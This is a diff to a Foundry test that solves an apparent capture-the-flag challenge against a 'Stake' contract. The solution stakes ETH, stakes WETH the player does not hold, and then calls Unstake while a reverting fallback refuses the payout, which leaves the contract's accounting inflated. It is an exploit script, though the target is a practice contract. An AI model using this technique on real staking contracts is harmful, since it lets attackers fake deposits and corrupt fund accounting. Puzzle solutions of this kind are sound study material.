@@ -12,6 +12,7 @@ interface IStaker {
 
   function StakeETH() external payable;
   function StakeWETH(uint256 amount) external returns (bool);
+  function Unstake(uint256 amount) external returns (bool);
 }
 
 interface IWETH {
@@ -37,21 +38,33 @@ contract StakeTest is Test {
     address wethAddress = IStaker(challengeAddress).WETH();
     IWETH(wethAddress).approve(challengeAddress, type(uint256).max);
 
+    // Make stakeAddress.balance != 0
+    IStaker(challengeAddress).StakeETH{value: 0.001 ether + 1 wei}();
+
     // Stake unexisting funds
     // (We do not have 0.001 ether + 1 wei in WETH)
     IStaker(challengeAddress).StakeWETH(0.001 ether + 1 wei);
 
-    // Make stakeAddress.balance != 0
-    IStaker(challengeAddress).StakeETH{value: 0.001 ether + 1 wei}();
+    // Trigger Unstake to flush our UserStake, but without receiving the funds
+    IStaker(challengeAddress).Unstake(0.001 ether + 1 wei);
+    /// IStaker(challengeAddress).Unstake(0.001 ether + 1 wei);
 
     // Check the winning conditions
+    // - The `Stake` contract's ETH balance has to be greater than 0.
     assertNotEq(challengeAddress.balance, 0);
+    // - totalStaked must be greater than the Stake contract's ETH balance.
     assertGt(IStaker(challengeAddress).totalStaked(), challengeAddress.balance);
-    // assertEq(IStaker(challengeAddress).UserStake(playerAddress), 0);
+    // - You must be a staker.
     assertTrue(IStaker(challengeAddress).Stakers(playerAddress));
+    // - Your staked balance must be 0.
+    // assertEq(IStaker(challengeAddress).UserStake(playerAddress), 0);
 
     vm.stopPrank();
 
     // utils.submitLevelInstance(challengeAddress);
+  }
+
+  fallback() external payable {
+    revert("not receiving these funds");
   }
 }
